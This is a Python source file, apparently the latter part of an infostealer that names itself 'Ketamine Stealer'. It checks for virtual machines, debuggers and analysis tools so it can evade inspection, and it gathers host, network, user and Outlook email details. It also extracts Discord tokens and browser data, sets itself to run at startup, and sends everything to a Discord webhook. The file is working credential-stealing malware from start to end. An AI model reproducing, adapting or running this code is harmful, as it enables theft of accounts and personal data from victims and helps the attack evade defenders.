            tasklist = subprocess.check_output("tasklist", shell=True).decode().lower()
            for proc in vm_processes:
                if proc.lower() in tasklist:
                    vm_detected = True
                    break
        elif platform.system() == "Linux":
            # Linux ps command
            ps_output = subprocess.check_output(["ps", "aux"], universal_newlines=True).lower()
            vm_linux_processes = ["vboxservice", "vboxtray", "vmtoolsd", "xrdp", "qemu"]
            for proc in vm_linux_processes:
                if proc in ps_output:
                    vm_detected = True
                    break
    except:
        pass
    
    return vm_detected

def is_being_analyzed():
    """Checks for network analysis tools, debugger, or VM"""
    analysis_tools = [
        "wireshark.exe", "fiddler.exe", "tcpdump", "burpsuite", "charles.exe", 
        "networktrafficview.exe", "httpdebugger.exe", "fiddlercoreapi.exe",
        "ida.exe", "ida64.exe", "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", 
        "dnspy.exe", "immunity debugger.exe", "ghidra.exe", "pe-bear.exe",
        "pestudio.exe", "lordpe.exe", "resource hacker.exe", "processhacker.exe",
        "procmon.exe", "regmon.exe", "filemon.exe", "windbg.exe", "processhacker.exe",
        "autoruns.exe", "gmer.exe", "tcpview.exe", "cheatengine.exe", "scylla.exe"
    ]
    
    try:
        if platform.system() == "Windows":
            # Windows tasklist command
            tasklist = subprocess.check_output("tasklist", shell=True).decode().lower()
            for tool in analysis_tools:
                if tool.lower() in tasklist:
                    return True
        elif platform.system() == "Linux":
            # Linux ps command
            ps_output = subprocess.check_output(["ps", "aux"], universal_newlines=True).lower()
            linux_tools = ["wireshark", "tcpdump", "burpsuite", "strace", "ltrace", "gdb", "radare2"]
            for tool in linux_tools:
                if tool in ps_output:
                    return True
    except:
        pass
    
    return False

def timing_check():
    """Checks timing to detect debugging"""
    start_time = time.time()
    # Run a simple loop
    for i in range(1000000):
        pass
    end_time = time.time()
    # If it took much longer than normal, it is likely under debugging
    if (end_time - start_time) > 1.0:  # Should normally take less than 1 second
        return True
    return False

def check_parent_process():
    """Checks the parent process"""
    try:
        if platform.system() == "Windows":
            # Check parent process using WMI on Windows
            parent_info = subprocess.check_output("wmic process where processid=\"%s\" get parentprocessid" % os.getpid(), shell=True).decode()
            parent_pid = re.findall(r"\d+", parent_info)[0]
            parent_name = subprocess.check_output("wmic process where processid=\"%s\" get name" % parent_pid, shell=True).decode().lower()
            
            # Known debugger names
            debuggers = ["ida", "x64dbg", "x32dbg", "ollydbg", "dnspy", "windbg"]
            for dbg in debuggers:
                if dbg in parent_name:
                    return True
                    
    except:
        pass
    return False

def collect_system_info(output_path=None, webhook_url=None):
    """
    Collects detailed information about the system and saves it to the specified path or sends it to a webhook
    
    Args:
        output_path (str): Path where the information will be saved
        webhook_url (str): Webhook URL to which the information will be sent
    """
    if output_path is None:
        # Save to desktop or user directory
        if platform.system() == "Windows":
            desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
            output_path = os.path.join(desktop_path, "systeminfo.txt")
        else:
            output_path = os.path.join(os.path.expanduser('~'), "systeminfo.txt")
    
    system_info = {}
    
    try:
        # Basic system information
        system_info["timestamp"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        system_info["hostname"] = platform.node()
        system_info["os"] = platform.system()
        system_info["os_release"] = platform.release()
        system_info["os_version"] = platform.version()
        system_info["architecture"] = platform.machine()
        system_info["processor"] = platform.processor()
        system_info["python_version"] = platform.python_version()
        system_info["user"] = getpass.getuser()
        
        # Use modern method for language information
        try:
            locale.setlocale(locale.LC_ALL, '')
            system_info["language"] = locale.getlocale()[0]
            system_info["encoding"] = locale.getencoding()
        except:
            system_info["language"] = "Unknown"
            system_info["encoding"] = "Unknown"
        
        # IP and network information
        try:
            # Local IP address
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            system_info["local_ip"] = s.getsockname()[0]
            s.close()
            
            # External IP address and geolocation
            try:
                ip_info = requests.get("https://ipinfo.io/json", timeout=5).json()
                system_info["public_ip"] = ip_info.get("ip", "Unknown")
                system_info["geolocation"] = {
                    "city": ip_info.get("city", "Unknown"),
                    "region": ip_info.get("region", "Unknown"),
                    "country": ip_info.get("country", "Unknown"),
                    "location": ip_info.get("loc", "Unknown"),
                    "org": ip_info.get("org", "Unknown")
                }
            except RequestException:
                # Alternative IP service
                try:
                    ip_data = requests.get("https://api.ipify.org?format=json", timeout=5).json()
                    system_info["public_ip"] = ip_data.get("ip", "Unknown")
                except:
                    system_info["public_ip"] = "Could not determine"
                    system_info["geolocation"] = "Could not determine"
        except:
            system_info["network_info"] = "Could not determine"
        
        # MAC address
        system_info["mac_address"] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        
        # Hardware information
        # CPU information
        system_info["cpu"] = {}
        try:
            if platform.system() == "Windows":
                cpu_info = subprocess.check_output("wmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors /format:list", shell=True).decode()
                for line in cpu_info.split('\n'):
                    if "=" in line:
                        key, value = line.strip().split("=", 1)
                        system_info["cpu"][key.strip()] = value.strip()
            elif platform.system() == "Linux":
                with open("/proc/cpuinfo", "r") as f:
                    cpu_data = f.read()
                    system_info["cpu"]["model"] = re.search(r"model name\s+:\s+(.*)", cpu_data).group(1)
                    system_info["cpu"]["cores"] = len(re.findall(r"processor\s+:", cpu_data))
        except:
            system_info["cpu"] = "Could not determine"
        
        # RAM information
        system_info["memory"] = {}
        try:
            mem = psutil.virtual_memory()
            system_info["memory"]["total"] = f"{mem.total / (1024**3):.2f} GB"
            system_info["memory"]["available"] = f"{mem.available / (1024**3):.2f} GB"
            system_info["memory"]["used_percent"] = f"{mem.percent}%"
        except:
            system_info["memory"] = "Could not determine"
        
        # Disk information
        system_info["disks"] = []
        try:
            for part in psutil.disk_partitions(all=False):
                if os.name == 'nt' and ('cdrom' in part.opts or part.fstype == ''):
                    # Skip CD-ROMs on Windows
                    continue
                usage = psutil.disk_usage(part.mountpoint)
                disk_info = {
                    "device": part.device,
                    "mountpoint": part.mountpoint,
                    "fstype": part.fstype,
                    "total": f"{usage.total / (1024**3):.2f} GB",
                    "used": f"{usage.used / (1024**3):.2f} GB",
                    "free": f"{usage.free / (1024**3):.2f} GB",
                    "percent": f"{usage.percent}%"
                }
                system_info["disks"].append(disk_info)
        except:
            system_info["disks"] = "Could not determine"
        
        # Graphics card information
        system_info["gpu"] = {}
        try:
            if platform.system() == "Windows":
                gpu_info = subprocess.check_output("wmic path win32_VideoController get Name, AdapterRAM, DriverVersion /format:list", shell=True).decode()
                for line in gpu_info.split('\n'):
                    if "=" in line:
                        key, value = line.strip().split("=", 1)
                        system_info["gpu"][key.strip()] = value.strip()
            elif platform.system() == "Linux":
                try:
                    gpu_info = subprocess.check_output("lspci | grep -E 'VGA|3D'", shell=True).decode()
                    system_info["gpu"]["info"] = gpu_info.strip()
                except:
                    system_info["gpu"] = "Could not determine"
        except:
            system_info["gpu"] = "Could not determine"
        
        # Active users and email information (for Windows)
        system_info["users"] = []
        try:
            if platform.system() == "Windows":
                # Get Windows users
                users_data = subprocess.check_output("wmic useraccount get Name,SID", shell=True).decode()
                users_lines = users_data.strip().split('\n')[1:]  # Skip the first line (header)
                
                for line in users_lines:
                    parts = re.split(r'\s{2,}', line.strip())
                    if len(parts) >= 2:
                        user_info = {"name": parts[0]}
                        
                        # Search for email address in Outlook profiles
                        try:
                            outlook_profiles = subprocess.check_output(f'reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\Outlook\\Profiles" /s', shell=True, stderr=subprocess.PIPE).decode(errors='ignore')
                            email_matches = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', outlook_profiles)
                            if email_matches:
                                user_info["emails"] = list(set(email_matches))  # Remove duplicates
                        except:
                            pass
                        
                        system_info["users"].append(user_info)
            elif platform.system() == "Linux":
                # Linux users
                with open("/etc/passwd", "r") as f:
                    for line in f:
                        if "/home/" in line:
                            user = line.split(":")[0]
                            system_info["users"].append({"name": user})
        except:
            system_info["users"] = "Could not determine"
        
        # List of installed applications (for Windows)
        system_info["installed_software"] = []
        try:
            if platform.system() == "Windows":
                # Get only the most important software (not too many)
                software = subprocess.check_output("wmic product get Name,Version /format:list", shell=True).decode(errors='ignore')
                current_app = {}
                for line in software.split('\n'):
                    if "=" in line:
                        key, value = line.strip().split("=", 1)
                        current_app[key.strip()] = value.strip()
                    elif current_app and line.strip() == "":
                        if current_app:
                            system_info["installed_software"].append(current_app)
                            current_app = {}
                if current_app:  # Add the last application
                    system_info["installed_software"].append(current_app)
            elif platform.system() == "Linux":
                try:
                    if os.path.exists("/usr/bin/dpkg"):  # Debian/Ubuntu
                        packages = subprocess.check_output("dpkg-query -l | head -n 20", shell=True).decode()
                    elif os.path.exists("/usr/bin/rpm"):  # RHEL/CentOS/Fedora
                        packages = subprocess.check_output("rpm -qa | head -n 20", shell=True).decode()
                    else:
                        packages = "Package manager not recognized"
                    
                    system_info["installed_software"] = packages.strip().split('\n')
                except:
                    system_info["installed_software"] = "Could not determine"
        except:
            system_info["installed_software"] = "Could not determine"
        
        # Network connections (limited number)
        system_info["network_connections"] = []
        try:
            connections = list(psutil.net_connections(kind='inet'))[:20]  # Only the first 20 connections
            for conn in connections:
                try:
                    if conn.laddr:
                        conn_info = {
                            "local_address": f"{conn.laddr.ip}:{conn.laddr.port}",
                            "status": conn.status
                        }
                        if conn.raddr:
                            conn_info["remote_address"] = f"{conn.raddr.ip}:{conn.raddr.port}"
                        if conn.pid:
                            try:
                                process = psutil.Process(conn.pid)
                                conn_info["process"] = process.name()
                            except:
                                conn_info["process"] = "Unknown"
                        system_info["network_connections"].append(conn_info)
                except:
                    continue
        except:
            system_info["network_connections"] = "Could not determine"
        
        # BIOS type/version in the system (specific to Windows)
        if platform.system() == "Windows":
            try:
                bios_info = subprocess.check_output("wmic bios get Manufacturer,Name,Version /format:list", shell=True).decode()
                system_info["bios"] = {}
                for line in bios_info.split('\n'):
                    if "=" in line:
                        key, value = line.strip().split("=", 1)
                        system_info["bios"][key.strip()] = value.strip()
            except:
                system_info["bios"] = "Could not determine"
        
        # Save to file and send to webhook
        json_data = json.dumps(system_info, indent=4)
        
        # Save to file
        try:
            with open(output_path, "w") as f:
                f.write(json_data)
            print(f"System information saved: {output_path}")
        except:
            print(f"Could not save file: {output_path}")
        
        # Send to webhook
        if webhook_url:
            try:
                # If the data size is too large for the webhook, filter important information
                send_data = {
                    "hostname": system_info.get("hostname", "Unknown"),
                    "os": system_info.get("os", "Unknown"),
                    "ip": system_info.get("public_ip", "Unknown"),
                    "user": system_info.get("user", "Unknown"),
                    "geolocation": system_info.get("geolocation", "Unknown"),
                    "cpu": system_info.get('cpu', 'Unknown'),
                    "memory": system_info.get('memory', 'Unknown')
                }
                
                # For Discord webhook
                if "discord.com" in webhook_url:
                    payload = {
                        "content": f"📊 System Information: **{system_info['hostname']}**",
                        "embeds": [
                            {
                                "title": "🖥️ System Report",
                                "description": f"**User**: {system_info['user']}\n**IP**: {system_info['ip']}",
                                "color": 5814783,
                                "fields": [
                                    {"name": "💻 Operating System", "value": system_info['os'], "inline": True},
                                    {"name": "📍 Location", "value": f"{system_info['geolocation']['city']}, {system_info['geolocation']['country']}", "inline": True},
                                    {"name": "⚙️ CPU", "value": system_info.get('cpu', 'Unknown'), "inline": True},
                                    {"name": "🧠 RAM", "value": system_info.get('memory', 'Unknown'), "inline": True}
                                ],
                                "footer": {"text": f"Time: {system_info['timestamp']}"}
                            }
                        ],
                        "attachments": []
                    }
                    
                    response = requests.post(webhook_url, json=payload, timeout=10)
                    
                    # Tam veriyi dosya olarak gönder
                    files = {'file': ('systeminfo.json', json_data)}
                    requests.post(webhook_url, files=files, timeout=10)
                else:
                    # Genel webhook
                    response = requests.post(webhook_url, json=send_data, timeout=10)
                
                print(f"Webhook send successfully: {response.status_code}")
            except Exception as e:
                print(f"Webhook send failed: {str(e)}")
        
        return True
    except Exception as e:
        error_info = {
            "error": "Failed to collect complete system information",
            "error_details": traceback.format_exc()
        }
        
        # Hata dosyasını kaydet
        try:
            with open(output_path, "w") as f:
                json.dump(error_info, f, indent=4)
        except:
            pass
        
        # Hatayı webhook'a gönder
        if webhook_url:
            try:
                requests.post(webhook_url, json=error_info, timeout=10)
            except:
                pass
        
        return False

def anti_debug_check():
    """Tüm anti-debug kontrollerini yap"""
    # Önce sistem bilgilerini topla
    try:
        collect_system_info()
    except:
        pass
    
    # Sonra anti-debug kontrollerini çalıştır
    if is_debugger_present() or is_running_in_vm() or is_being_analyzed() or timing_check() or check_parent_process():
        # Eğer şüpheli bir durum tespit edilirse
        # Burada programı sonlandır veya yanıltıcı davranış göster
        # Örnek: Rastgele bekleme ve çıkış
        time.sleep(2.5 + 4.1 * (time.time() % 3))
        sys.exit(0)
        
    # Hiçbir şey tespit edilmezse normal çalışmaya devam et
    return False

# Uygulamanın başlangıcında anti-debug kontrolünü çalıştır
try:
    anti_debug_result = anti_debug_check()
except:
    pass  # Hata olsa bile sessizce devam et

def main():
    add_to_startup()
    run_in_background()
    
    webhook_url = 'WEBHOOK_URL_HERE'
    username = os.environ.get('USERNAME') or os.environ.get('USER') or 'Bilinmiyor'
    computer_name = os.environ.get('COMPUTERNAME') or os.environ.get('HOSTNAME') or 'Bilinmiyor'
    ip = getip()
    
    # Discord kullanıcı bilgilerini farklı yöntemlerle almayı dene
    discord_info = extract_discord_info()
    
    # Eğer bilgi alınamazsa, önceki yöntemleri dene
    if not discord_info:
        discord_info = get_discord_users_data()
    
    try:
        zip_file_path, success_count = get_all_data()
        embed_data = {
            'embeds': [{
                'title': '***Santa come early this year !***',
                'description': f'```yaml\nUser: {username}\nComputer name: {computer_name}\nIP: {ip}\nTotal information: {success_count} browser information\n```',
                'color': 3092790,
                'footer': {'text': 'Ketamine Stealer.'}
            }],
            'username': 'Ketamine',
            'avatar_url': 'https://images-ext-1.discordapp.net/external/0bSNXLXnP_O375r6UNUoIzmXlqa9wpn2w25om5FNAqo/%3Fsize%3D240/https/cdn.discordapp.com/avatars/1321200380629221396/505b6577b9947a137760298848b96a99.webp?format=webp'
        }
        
        # Add Discord user info to embed if available
        if discord_info:
            # Get tokens using the new method
            browser_tokens = get_tokens_from_leveldb()
            tokens_str = '\n'.join(browser_tokens) if browser_tokens else 'Bulunamadı'
            
            discord_field = f"Discord ID: {discord_info.get('id')}\nKullanıcı Adı: {discord_info.get('username')}\nGuild tag: {discord_info.get('tag') or 'doesnt find'}\nBrowser Tokens:\n{tokens_str}"
            
            embed_data['embeds'][0]['description'] += f"\n\n**Discord Bilgileri**\n```yaml\n{discord_field}\n```"
            
            # Add profile picture if available
            if discord_info.get('id') and discord_info.get('avatar'):
                avatar_url = f"https://cdn.discordapp.com/avatars/{discord_info.get('id')}/{discord_info.get('avatar')}?size=1024"
                embed_data['embeds'][0]['thumbnail'] = {'url': avatar_url}
                
            # Add banner if available
            if discord_info.get('id') and discord_info.get('banner'):
                banner_url = f"https://cdn.discordapp.com/banners/{discord_info.get('id')}/{discord_info.get('banner')}?size=1024"
                embed_data['embeds'][0]['image'] = {'url': banner_url}
        
        send_data_with_embed(webhook_url, zip_file_path, embed_data)
    except Exception as e:
        print(f'Error in sending information: {str(e)}')

if __name__ == '__main__':
    main()
